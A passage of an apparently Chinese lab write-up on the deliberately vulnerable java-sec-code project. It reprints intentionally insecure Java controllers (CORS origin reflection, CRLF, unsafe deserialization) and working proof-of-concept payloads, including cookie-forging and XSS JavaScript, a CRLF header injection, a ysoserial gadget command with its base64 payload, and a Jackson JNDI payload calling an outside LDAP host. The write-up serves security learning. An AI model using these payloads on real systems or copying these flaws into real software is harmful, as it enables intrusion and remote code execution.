&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><p>vuln01</p><p><a href="http://127.0.0.1:8081/cookie/vuln01">http://127.0.0.1:8081/cookie/vuln01</a></p><p>抓包改 cookie，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Cookie: <span class="hljs-attribute">nick</span>=admin;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080930981.png" alt="20250723141110105"></p><p>vuln02</p><p>同 vuln01</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931435.png" alt="20250723141320799"></p><p>vuln03</p><p>因为大小写敏感，所以要写准确的 nick</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931594.png" alt="20250723141512271"></p><p>如果不是全小写，就会被拦截</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931715.png" alt="20250723141532175"></p><p>vuln04</p><p>不区分大小写，</p><p>vuln05</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 伪造一个 nick=admin 的 Cookie</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;nick=admin; path=/&quot;</span>;<br><br><span class="hljs-comment">// 发送请求，获取接口返回</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://127.0.0.1:8081/cookie/vuln05&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(text));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931254.png" alt="20250723142428662"></p><p>vuln06</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931560.png" alt="20250723142510453"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;nick=&lt;script&gt;alert(1)&lt;/script&gt;; path=/&quot;</span>;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://127.0.0.1:8081/cookie/vuln06&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(text));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931254.png"></p><h2 id="Cors"><a href="#Cors" class="headerlink" title="Cors"></a>Cors</h2><blockquote><p>跨域资源共享 CORS 详解</p><p><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p><h4 id="原理与工作流程"><a href="#原理与工作流程" class="headerlink" title="原理与工作流程"></a>原理与工作流程</h4><p>CORS（Cross-Origin Resource Sharing）跨源资源共享，是HTML5的一个新特性，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AJAX只能同源使用的限制。</p><p>CORS的基本原理是，第三方网站服务器生成访问控制策略，指导用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据。</p><p>相比之下，CORS较JSONP更为复杂，JSONP只能用于获取资源（即只读，类似于GET请求），而CORS支持所有类型的HTTP请求，功能完善。</p><p>CORS具体工作流程可分为三步，</p><ol><li>资源服务器根据请求中Origin头返回访问控制策略(Access-Control-Allow-Origin响应头)，并在其中声明允许读取响应内容的源；</li><li>浏览器检查资源服务器在Access-Control-Allow-Origin头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许；</li></ol><h4 id="CORS与CSRF的区别"><a href="#CORS与CSRF的区别" class="headerlink" title="CORS与CSRF的区别"></a>CORS与CSRF的区别</h4><p>一般有CORS漏洞的地方都有CSRF。</p><p>CSRF一般使用form表单提交请求，而浏览器是不会对form表单进行同源拦截的，因为这是无响应的请求，浏览器认为无响应请求是安全的。</p><p>浏览器的同源策略的本质是：一个域名的JS，在未经允许的情况下是不得读取另一个域名的内容，但浏览器并不阻止向另一个域名发送请求。</p><p>相同点：都需要第三方网站；都需要借助Ajax的异步加载过程；一般都需要用户登录目标站点。</p><p>不同点：一般CORS漏洞用于读取受害者的敏感信息，获取请求响应的内容；而CSRF则是诱使受害者点击提交表单来进行某些敏感操作，不用获取请求响应内容。</p><p>由于代码限制不严格，会导致跨域请求伪造可以结合xss，csrf进行攻击</p></blockquote><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;Cors.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/cors&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cors</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;</span>;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/vuln/origin&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuls1</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">origin</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;origin&quot;</span>);<br>        <span class="hljs-comment">//后端无验证，直接将前端传来的 origin 反射回去，没有判断这个 origin 是否合法</span><br>        response.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, origin); <span class="hljs-comment">// set origin from header</span><br>        <span class="hljs-comment">//可以在跨域请求中携带 Cookie / Session / Authorization 这些身份凭证</span><br>        response.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);  <span class="hljs-comment">// allow cookie</span><br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/vuln/setHeader&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuls2</span><span class="hljs-params">(HttpServletResponse response)</span> &#123;<br>        <span class="hljs-comment">// 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常</span><br>        response.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>);<br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); //任意网站都可以访问本网站</code></p><p><code>response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  //允许这些任意网站带上用户的 Cookie 来访问本网站</code></p><p>这俩个头一起用就导致攻击者可以构造任意恶意网页，从任意网站带上 Cookie 访问本网站，获取到用户数据，造成数据泄露。</p><p><strong>漏洞利用：</strong></p><p>攻击者从 <code>evil.com</code> 发起跨域请求（使用前端脚本携带 Cookie 向另一个子域发请求），诱导已经在 <code>http://127.0.0.1:8081</code> 网站上登录的用户访问  <code>evil.com</code> ，而由于服务端设置了<code>response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</code>，所以当攻击者访问 <code>http://127.0.0.1:8081/cors/vuln/origin</code> 页面，服务端无过滤就会响应，使得攻击者拿到敏感信息。</p><p>cors复现: <a href="https://blog.csdn.net/wanmiqi/article/details/119573354">https://blog.csdn.net/wanmiqi/article/details/119573354</a></p><h2 id="CRLFInjection"><a href="#CRLFInjection" class="headerlink" title="CRLFInjection"></a>CRLFInjection</h2><blockquote><p>初识HTTP响应拆分攻击（CRLF Injection）</p><p><a href="https://www.anquanke.com/post/id/240014">https://www.anquanke.com/post/id/240014</a></p><p>CRLF 指的是<strong>回车符</strong>（CR，ASCII 13，\r，%0d）和<strong>换行符</strong>（LF，ASCII 10，\n，%0a）的简称（\r\n）。在《<a href="http://mp.weixin.qq.com/s?__biz=MzU2NzY5MjAwNQ==&mid=2247483836&idx=1&sn=1b1ccd6f196c87b7f3bf4b1c585d9d9e&chksm=fc981e36cbef972043707782aaa968ba94a960adba855a35afc5e896edeb2160d513ab1667cf&scene=21#wechat_redirect">HTTP | HTTP报文</a>》一文中，我们可以了解到HTTP报文的结构：HTTP报文以状态行开始，跟在后面的是HTTP首部（HTTP Header），首部由多个首部字段构成，每行一个首部字段，HTTP首部后是一个空行，然后是报文主体（HTTP Body）。状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。或者理解为首部中每个首部字段以一个CRLF分隔，首部和主体由两个CRLF分隔。</p><p>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些恶意的HTTP Header，如会话Cookie，甚至可以注入一些HTML代码。这就是CRLF注入漏洞的核心原理。</p><p>在实际应用中，如果Web应用没有对用户输入做严格验证，便会导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以CRLF注入漏洞又称为HTTP响应拆分漏洞（HTTP Response Splitting），简称HRS。</p></blockquote><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;CRLFInjection.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/crlf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CRLFInjection</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/safecode&quot;)</span><br>    <span class="hljs-comment">//表示该方法直接将返回结果写入 HTTP 响应体中</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-comment">//接收 HttpServletRequest request: 客户端发来的请求对象，HttpServletResponse response: 用于构造响应返回给客户端。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">crlf</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-comment">//将用户传入的 test1 作为值添加到响应头中</span><br>        response.addHeader(<span class="hljs-string">&quot;test1&quot;</span>, request.getParameter(<span class="hljs-string">&quot;test1&quot;</span>));<br>        <span class="hljs-comment">//设置 test2 响应头为请求参数 test2 的值。如果该 header 已存在，将被覆盖</span><br>        response.setHeader(<span class="hljs-string">&quot;test2&quot;</span>, request.getParameter(<span class="hljs-string">&quot;test2&quot;</span>));<br>        <span class="hljs-comment">//获取参数 test3 的值，赋给 author</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;test3&quot;</span>);<br>        <span class="hljs-comment">//创建一个新的 Cookie，名为 test3，值为 author</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;test3&quot;</span>, author);<br>        <span class="hljs-comment">//将该 Cookie 添加到响应头中</span><br>        response.addCookie(cookie);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><p>构造POC：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/crlf/safecode?test<span class="hljs-number">1</span><span class="hljs-operator">=</span>abc<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>ASet-Cookie:<span class="hljs-variable">%20</span>evil<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>正常来讲应该看到一个新的标头</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Set-Cookie: <span class="hljs-attribute">evil</span>=1<br></code></pre></td></tr></table></figure><p>我这里没有复现成功，可能是因为 tomcat 版本高自动过滤了 <code>\r\n</code> </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080933198.png" alt="20250723161852286"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><a href="https://blog.csdn.net/qq_43378996/article/details/123910614">CSRF漏洞原理攻击与防御（非常细）-CSDN博客</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080933314.jpeg" alt="20250724095137238"></p><p>所以要被CSRF攻击，必须同时满足两个条件：</p><ul><li>登录受信任网站A，并在本地生成Cookie。</li><li>在不登出A的情况下，访问危险网站B。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/csrf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CSRF</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;form&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/post&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">post</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CSRF passed.&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Deserialize"><a href="#Deserialize" class="headerlink" title="Deserialize"></a>Deserialize</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> org.joychou.controller;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> org.joychou.config.Constants;<br><span class="hljs-keyword">import</span> org.joychou.security.AntObjectInputStream;<br><span class="hljs-keyword">import</span> org.slf4j.Logger;<br><span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.Cookie;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InvalidClassException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.springframework.web.util.WebUtils.getCookie;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Deserialize RCE using Commons-Collections gadget.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> JoyChou @2018-06-14</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/deserialize&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Deserialize</span> &#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64 &lt;br&gt;</span><br><span class="hljs-comment">     * &lt;a href=&quot;http://localhost:8080/deserialize/rememberMe/vuln&quot;&gt;http://localhost:8080/deserialize/rememberMe/vuln&lt;/a&gt;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/rememberMe/vuln&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">rememberMeVul</span><span class="hljs-params">(HttpServletRequest request)</span><br>            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//从请求中读取 rememberMe cookie</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(request, Constants.REMEMBER_ME_COOKIE);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//将 rememberMe cookie 中 Base64 编码的数据进行解码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);<br><br>        <span class="hljs-comment">//将 byte[] 包装成字节输入流</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decoded);<br>        <span class="hljs-comment">//构造 ObjectInputStream 对象，从流中读取对象，</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytes);<br>        <span class="hljs-comment">//读取字节流中的对象，进行反序列化，若 cookie 中包含恶意类，将被执行</span><br>        in.readObject();<br>        in.close();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Are u ok?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Check deserialize class using black list. &lt;br&gt;</span><br><span class="hljs-comment">     * Or update commons-collections to 3.2.2 or above.Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons.To enable it set system property &#x27;org.apache.commons.collections.enableUnsafeSerialization&#x27; to &#x27;true&#x27;,but you must ensure that your application does not de-serialize objects from untrusted sources.&lt;br&gt;</span><br><span class="hljs-comment">     * &lt;a href=&quot;http://localhost:8080/deserialize/rememberMe/security&quot;&gt;http://localhost:8080/deserialize/rememberMe/security&lt;/a&gt;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">//黑名单过滤</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/rememberMe/security&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">rememberMeBlackClassCheck</span><span class="hljs-params">(HttpServletRequest request)</span><br>            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(request, Constants.REMEMBER_ME_COOKIE);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);<br><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decoded);<br><br>        <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//使用自定义 AntObjectInputStream 类进行反序列化。该类内部通过黑名单机制禁止一些已知的恶意类</span><br>            <span class="hljs-type">AntObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AntObjectInputStream</span>(bytes);  <span class="hljs-comment">// throw InvalidClassException</span><br>            in.readObject();<br>            in.close();<br>        &#125; <span class="hljs-keyword">catch</span> (InvalidClassException e) &#123;<br>            logger.info(e.toString());<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I&#x27;m very OK.&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// String payload = &quot;[\&quot;org.jsecurity.realm.jndi.JndiRealmFactory\&quot;, &#123;\&quot;jndiNames\&quot;:\&quot;ldap://30.196.97.50:1389/yto8pc\&quot;&#125;]&quot;;</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/jackson&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Jackson</span><span class="hljs-params">(String payload)</span> &#123;<br>        <span class="hljs-comment">//ObjectMapper 是 Jackson 提供的 JSON 解析器</span><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        mapper.enableDefaultTyping();<br>        <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//反序列化用户输入的 JSON </span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> mapper.readValue(payload, Object.class);<br>            mapper.writeValueAsString(obj);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><p>ysoserial.jar 生成 payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">路由：<br>/deserialize/rememberMe/vuln<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">Windows：<br><br>java -jar ~<span class="hljs-string">/ysoserial.jar</span> CommonsCollections5 calc | base64<br><br>rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YW<span class="hljs-keyword">ls</span>TWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dG<span class="hljs-keyword">ls</span>LkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dG<span class="hljs-keyword">ls</span>L0NvbGxlY3Rpb247eHBzcgATamF2YS51dG<span 